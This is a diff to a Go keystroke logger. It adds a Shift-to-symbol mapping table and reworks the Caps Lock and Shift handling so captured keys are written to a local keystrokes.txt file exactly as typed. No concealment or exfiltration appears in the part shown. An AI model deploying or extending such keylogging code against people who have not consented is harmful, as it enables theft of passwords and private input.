@@ -84,6 +84,15 @@ func main() {
 	shiftActive := false
 	capsLockActive := false
 
+	// Shift mapping for special characters
+	shiftMappings := map[string]string{
+		"1": "!", "2": "@", "3": "#", "4": "$", "5": "%",
+		"6": "^", "7": "&", "8": "*", "9": "(", "0": ")",
+		"-": "_", "=": "+", "[": "{", "]": "}", "\\": "|",
+		";": ":", "'": "\"", ",": "<", ".": ">", "/": "?",
+		"`": "~",
+	}
+
 	for e := range events {
 		switch e.Type {
 		case keylogger.EvKey:
@@ -120,13 +129,19 @@ func main() {
 						_ = os.WriteFile("keystrokes.txt", fileContent, 0644)
 					}
 				default:
-					// Convert case correctly based on Shift and Caps Lock
-					if len(keyStr) == 1 {
-						// Apply uppercase rules
-						if (shiftActive && !capsLockActive) || (!shiftActive && capsLockActive) {
-							keyStr = strings.ToUpper(keyStr) // Apply Uppercase
-						} else {
-							keyStr = strings.ToLower(keyStr) // Apply Lowercase
+					// Determine if Shift should modify the key
+					if shiftActive {
+						if shiftedKey, exists := shiftMappings[keyStr]; exists {
+							keyStr = shiftedKey // Convert numbers/symbols with Shift
+						} else if len(keyStr) == 1 && keyStr >= "a" && keyStr <= "z" {
+							keyStr = strings.ToUpper(keyStr) // Convert lowercase letters to uppercase
+						}
+					} else {
+						// Apply Caps Lock only to letters
+						if capsLockActive && len(keyStr) == 1 && keyStr >= "a" && keyStr <= "z" {
+							keyStr = strings.ToUpper(keyStr) // Convert lowercase to uppercase
+						} else if !capsLockActive && len(keyStr) == 1 && keyStr >= "A" && keyStr <= "Z" {
+							keyStr = strings.ToLower(keyStr) // Convert uppercase to lowercase when Caps Lock is OFF
 						}
 					}
 
@@ -138,4 +153,5 @@ func main() {
 			}
 		}
 	}
+
 }
